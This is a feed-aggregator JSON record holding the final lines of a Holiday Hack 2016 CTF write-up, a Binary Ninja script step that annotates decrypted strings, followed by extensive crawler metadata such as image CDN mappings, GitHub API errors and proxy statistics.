class=\"p\">)</span></code></pre> \n</figure> \n<p><em>Write the resulting string as a comment next to the function call</em></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">curr_func</span><span class=\"o\">.</span><span class=\"n\">set_comment</span><span class=\"p\">(</span><span class=\"n\">rspeak</span><span class=\"o\">.</span><span class=\"n\">address</span><span class=\"p\">,</span> <span class=\"n\">res</span><span class=\"p\">)</span></code></pre> \n</figure> \n<p>The full script, along with our <code class=\"highlighter-rouge\">dumpdb.py</code> script, can be dropped in the <code class=\"highlighter-rouge\">~/.binaryninja/plugins</code>. This script can then be imported and called in Binary Ninja. If all works out, we should see comments of strings next to our <code class=\"highlighter-rouge\">rspeak_</code> function calls.</p> \n<p><img src=\"http://ctfhacker.com/assets/images/holidayhack2016/binja-dungeon.gif\" alt=\"binja-dungeon.gif\" /></p> \n<p>Thanks again to Counterhack for putting on another fantastic Holiday Hack! Thank you for sticking with me throughout this writeup. I hope you learned a little something from this. Have a great New Year! Happy hacking!</p>","descriptionType":"html","publishedDate":"Thu, 05 Jan 2017 18:03:59 +0000","feedId":19287,"bgimg":"http://ctfhacker.com/assets/images/holidayhack2016/business-card.gif","linkMd5":"557cb3d4be00f7145f6e7d4fd4f4b15c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn57@2020_1/2020/09/20/18-30-52-975_e015015ba3b0fb77.webp","destWidth":1600,"destHeight":900,"sourceBytes":433187,"destBytes":320962,"author":"Cory Duplantis","articleImgCdnMap":{"http://ctfhacker.com/assets/images/holidayhack2016/business-card.gif":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn57@2020_1/2020/09/20/18-30-52-975_e015015ba3b0fb77.webp","http://ctfhacker.com/assets/images/holidayhack2016/instagram.jpg":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn73@2020_6/2020/09/20/18-30-54-693_66556a472ddba0cc.webp","http://ctfhacker.com/assets/images/holidayhack2016/instagram_1_x6.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn14@2020_4/2020/09/20/18-30-54-571_89239289fbf0bbed.webp","http://ctfhacker.com/assets/images/holidayhack2016/instagram_2_x6.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn64@2020_2/2020/09/20/18-30-54-340_c2b5f018fae38ccb.webp","http://ctfhacker.com/assets/images/holidayhack2016/tweets.png":null,"http://ctfhacker.com/assets/images/holidayhack2016/train.gif":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn69@2020_2/2020/09/20/18-30-55-681_38b85a09b51d3338.webp","http://ctfhacker.com/assets/images/holidayhack2016/train2.gif":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn29@2020_5/2020/09/20/18-30-57-233_0551813dc18bb94f.webp","http://ctfhacker.com/assets/images/holidayhack2016/train3.gif":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn45@2020_3/2020/09/20/18-30-57-209_c594d665592a322d.webp","http://ctfhacker.com/assets/images/holidayhack2016/santa.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn78@2020_4/2020/09/20/18-30-54-327_c3f2bcd9b23f91ba.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn57@2020_5/2020/09/20/18-30-54-468_199d49829a3160e8.webp","http://ctfhacker.com/assets/images/holidayhack2016/dungeon1.gif":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn66@2020_2/2020/09/20/18-32-24-231_265fb66e5c63244d.webp","http://ctfhacker.com/assets/images/holidayhack2016/genymotion-proxy.gif":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn1@2020_6/2020/09/20/18-30-57-192_4e111644e7552b78.webp","http://ctfhacker.com/assets/images/holidayhack2016/genymotion-charles.gif":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn93@2020_1/2020/09/20/18-31-16-468_a0897207c8c76355.webp","http://ctfhacker.com/assets/images/holidayhack2016/charles.gif":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn90@2020_5/2020/09/20/18-30-59-846_93358ac78e3dfd47.webp","http://ctfhacker.com/assets/images/holidayhack2016/ex.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn25@2020_6/2020/09/20/18-30-54-348_a6305d9472b60ab2.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics1.gif":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn62@2020_1/2020/09/20/18-31-14-075_4b5da8dfafb599a5.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics2.gif":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn9@2020_5/2020/09/20/18-31-07-036_1619e9638732d40a.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics3.gif":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn5@2020_4/2020/09/20/18-30-54-940_000bd91952ffbb87.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics4.gif":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn22@2020_5/2020/09/20/18-31-05-112_05aef2611a68544c.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics5.gif":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn17@2020_4/2020/09/20/18-31-02-666_c19011146b53b81b.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics-audio.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn49@2020_1/2020/09/20/18-30-54-304_b7f7c9c75ec90eff.webp","http://ctfhacker.com/assets/images/holidayhack2016/analytics6.gif":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn86@2020_6/2020/09/20/18-31-14-534_f826f9742f502990.webp","http://ctfhacker.com/assets/images/holidayhack2016/audacity.gif":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn62@2020_4/2020/09/20/18-30-58-347_bc2373d87706457e.webp","http://ctfhacker.com/assets/images/holidayhack2016/final.gif":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn54@2020_4/2020/09/20/18-30-55-575_2b3ef1a3d2e84a68.webp","http://ctfhacker.com/assets/images/holidayhack2016/bonus1.gif":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn38@2020_6/2020/09/20/18-31-01-301_298878aa23f30ad4.webp","http://ctfhacker.com/assets/images/holidayhack2016/binja2.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn97@2020_3/2020/09/20/18-30-54-299_fc191ee5e96a2b15.webp","http://ctfhacker.com/assets/images/holidayhack2016/binja1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn81@2020_2/2020/09/20/18-30-54-282_76dc98bc9c731f4f.webp","http://ctfhacker.com/assets/images/holidayhack2016/binja-dungeon.gif":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn34@2020_6/2020/09/20/18-30-58-546_fd1d8b09cd005d9c.webp"},"publishedOrCreatedDate":1600626639469}],"record":{"createdTime":"2020-09-21 02:30:39","updatedTime":"2020-09-21 02:30:39","feedId":19287,"fetchDate":"Sun, 20 Sep 2020 18:30:39 +0000","fetchMs":230,"handleMs":616,"totalMs":107300,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"84e253ce38f288a60a012751fa1461fa","hostName":"europe-59*","requestId":"a19fe5420053434da7e63d11e1e3165a_19287","contentType":"application/xml","totalBytes":7888068,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":28,"articlesImgsGithubTotal":27,"successGithubMap":{"myreaderx8":1,"myreaderx15":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx4":1,"myreaderx10":1,"myreaderx33":1,"myreaderx11":1,"myreaderx3":1,"myreaderx12":1,"myreaderx2":1,"myreaderx13":1,"myreaderx1":1,"myreaderx30":1,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1}},"feed":{"createdTime":"2020-09-07 02:19:32","updatedTime":"2020-09-07 02:19:32","id":19287,"name":"CTF Hacker","url":"http://ctfhacker.com/feed.xml","subscriber":172,"website":null,"icon":"http://ctfhacker.com/favicon.ico","icon_jsdelivr":null,"description":"Spreading the knowledge","weekly":null,"link":"http://ctfhacker.com"},"noPictureArticleList":[{"createdTime":"2020-09-21 02:32:25","updatedTime":"2020-09-21 02:32:25","id":null,"feedId":19287,"linkMd5":"557cb3d4be00f7145f6e7d4fd4f4b15c"}],"tmpCommonImgCdnBytes":320962,"tmpBodyImgCdnBytes":7567106,"tmpBgImgCdnBytes":0,"extra4":{"start":1600626638341,"total":0,"statList":[{"spend":512,"msg":"获取xml内容"},{"spend":616,"msg":"解释文章"},{"spend":1,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":91520,"msg":"正文链接上传到cdn"}]},"extra5":28,"extra6":28,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/tweets.png","sourceStatusCode":200,"destWidth":409,"destHeight":487,"sourceBytes":71219,"destBytes":37466,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":104,"convertSpendMs":17,"createdTime":"2020-09-21 02:30:54","host":"us-51*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn41/contents/2020/09/20/18-30-54-298_fca9537dac863efc.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 20 Sep 2020 18:30:54 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["82DA:0916:3F003E0:911E6C1:5F679FD7"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1600626672"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn41/contents/2020/09/20/18-30-54-298_fca9537dac863efc.webp","historyStatusCode":[],"spendMs":45},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"52.6%","sourceSize":"69.5 KB","destSize":"36.6 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/tweets.png","sourceStatusCode":200,"destWidth":409,"destHeight":487,"sourceBytes":71219,"destBytes":37466,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":81,"convertSpendMs":18,"createdTime":"2020-09-21 02:30:54","host":"us-51*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn41/contents/2020/09/20/18-30-54-452_fca9537dac863efc.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Sun, 20 Sep 2020 18:30:54 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"status":["403 Forbidden"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["82DA:0916:3F003EE:911EB24:5F679FDE"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, read:packages, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1600626672"],"x-ratelimit-used":["60"],"x-xss-protection":["1; mode=block"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn41/contents/2020/09/20/18-30-54-452_fca9537dac863efc.webp","historyStatusCode":[],"spendMs":45},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"52.6%","sourceSize":"69.5 KB","destSize":"36.6 KB"},null],"extra10_invalidATagHrefValue":{"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#74-the-banner-ad-server":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#74-the-banner-ad-server","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-3-a-fresh-baked-holiday-pi":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-3-a-fresh-baked-holiday-pi","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#administrator-access":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#administrator-access","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#1-what-is-the-secret-message-in-santas-tweets":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#1-what-is-the-secret-message-in-santas-tweets","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-1-a-most-curious-business-card":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-1-a-most-curious-business-card","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#4-what-is-the-name-of-the-audible-component-audio-file-in-the-santagram-apk-file":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#4-what-is-the-name-of-the-audible-component-audio-file-in-the-santagram-apk-file","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#workshop-2---find-the-passphrase-from-the-wumpus--play-fair-or-cheat-its-up-to-you":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop-2---find-the-passphrase-from-the-wumpus--play-fair-or-cheat-its-up-to-you","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#santas-office---greetings-professor-falken":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#santas-office---greetings-professor-falken","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#8-what-are-the-names-of-the-audio-files-you-discovered-from-each-system-above":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#8-what-are-the-names-of-the-audio-files-you-discovered-from-each-system-above","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#workshop--train-station---train-management-console":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop--train-station---train-management-console","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#retrieving-the-treasure":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#retrieving-the-treasure","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#2-what-is-inside-the-zip-file-distributed-by-santas-team":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#2-what-is-inside-the-zip-file-distributed-by-santas-team","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#9-who-is-the-villain-behind-the-nefarious-plot":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#9-who-is-the-villain-behind-the-nefarious-plot","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-12-twitter":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-12-twitter","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-4-my-gosh-its-full-of-holes":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-4-my-gosh-its-full-of-holes","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#elf-house-2---to-open-the-door-find-both-parts-of-the-passphrase-inside-the-outpcap-file":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#elf-house-2---to-open-the-door-find-both-parts-of-the-passphrase-inside-the-outpcap-file","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#76-the-mobile-analytics-server-post-authentication":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#76-the-mobile-analytics-server-post-authentication","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#73-the-debug-server":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#73-the-debug-server","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#bonus-features---dungeon-game-20":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-features---dungeon-game-20","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#61-how-did-you-open-each-terminal-door":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#61-how-did-you-open-each-terminal-door","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#workshop-1---to-open-the-door-find-the-passphrase-file-deep-in-the-directories":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#workshop-1---to-open-the-door-find-the-passphrase-file-deep-in-the-directories","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#62-and-where-had-the-villain-imprisoned-santa":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#62-and-where-had-the-villain-imprisoned-santa","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#bonus-2---adding-the-decrypted-strings-to-binary-ninja":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-2---adding-the-decrypted-strings-to-binary-ninja","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#71-the-mobile-analytics-server-via-credentialed-login-access":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#71-the-mobile-analytics-server-via-credentialed-login-access","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-5-discombobulated-audio":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-5-discombobulated-audio","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_www.holidayhackchallenge.com":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/www.holidayhackchallenge.com","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-11-instagram":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-11-instagram","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#5-what-is-the-password-for-the-cranpi-account-on-the-cranberry-pi-system":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#5-what-is-the-password-for-the-cranpi-account-on-the-cranberry-pi-system","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#75-the-uncaught-exception-handler-server":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#75-the-uncaught-exception-handler-server","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#72-the-dungeon-game":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#72-the-dungeon-game","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#bonus-1---reversing-the-encryption-of-the-dungeon-game":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#bonus-1---reversing-the-encryption-of-the-dungeon-game","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#10-why-had-the-villain-abducted-santa":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#10-why-had-the-villain-abducted-santa","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#part-2-awesome-package-konveyance":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#part-2-awesome-package-konveyance","http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016_#3-what-username-and-password-are-embedded-in-the-apk-file":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016#3-what-username-and-password-are-embedded-in-the-apk-file"},"extra111_proxyServerAndStatMap":{"http://us-013.herokuapp.com/":{"failCount":1,"successCount":1,"resultList":[200,null]},"http://us-032.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-037.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-55.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-021.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-009.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-025.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-001.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-033.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe64.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-51.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-22.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/business-card.gif","sourceStatusCode":200,"destWidth":1600,"destHeight":900,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn57@2020_1/2020/09/20/18-30-52-975_e015015ba3b0fb77.webp","sourceBytes":433187,"destBytes":320962,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":11745,"convertSpendMs":10556,"createdTime":"2020-09-21 02:30:42","host":"us-037*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c,557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"74.1%","sourceSize":"423 KB","destSize":"313.4 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/binja1.png","sourceStatusCode":200,"destWidth":596,"destHeight":65,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn81@2020_2/2020/09/20/18-30-54-282_76dc98bc9c731f4f.webp","sourceBytes":13553,"destBytes":6194,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":775,"convertSpendMs":7,"createdTime":"2020-09-21 02:30:54","host":"us-029*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"45.7%","sourceSize":"13.2 KB","destSize":"6 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/analytics-audio.png","sourceStatusCode":200,"destWidth":906,"destHeight":207,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn49@2020_1/2020/09/20/18-30-54-304_b7f7c9c75ec90eff.webp","sourceBytes":16315,"destBytes":13228,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":876,"convertSpendMs":28,"createdTime":"2020-09-21 02:30:54","host":"us-017*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"81.1%","sourceSize":"15.9 KB","destSize":"12.9 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/binja2.png","sourceStatusCode":200,"destWidth":442,"destHeight":44,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn97@2020_3/2020/09/20/18-30-54-299_fc191ee5e96a2b15.webp","sourceBytes":7460,"destBytes":3962,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":873,"convertSpendMs":4,"createdTime":"2020-09-21 02:30:54","host":"us-55*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"53.1%","sourceSize":"7.3 KB","destSize":"3.9 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/santa.png","sourceStatusCode":200,"destWidth":520,"destHeight":453,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn78@2020_4/2020/09/20/18-30-54-327_c3f2bcd9b23f91ba.webp","sourceBytes":458723,"destBytes":61836,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":996,"convertSpendMs":26,"createdTime":"2020-09-21 02:30:54","host":"us-51*","referer":"http://ctfhacker.com/http://ctfhacker.github.io/pwn/2017/01/05/sans-holidayhack-2016","linkMd5ListStr":"557cb3d4be00f7145f6e7d4fd4f4b15c","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"13.5%","sourceSize":"448 KB","destSize":"60.4 KB"},{"code":1,"isDone":false,"source":"http://ctfhacker.com/assets/images/holidayhack2016/instagram_2_x6.jpg","sourceStatusCode":200,"destWidth":1692,"destHeight":810,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn64@2020_2/2020/09/20/18-30-54-340_c2b5f018fae38ccb.webp","sourceBytes":106833,"destBytes":41124,"targetWebpQuality":75,"feedId":19287,"totalSpendMs":991,"convertSpendMs":55,"createdTime":"2020-09-21 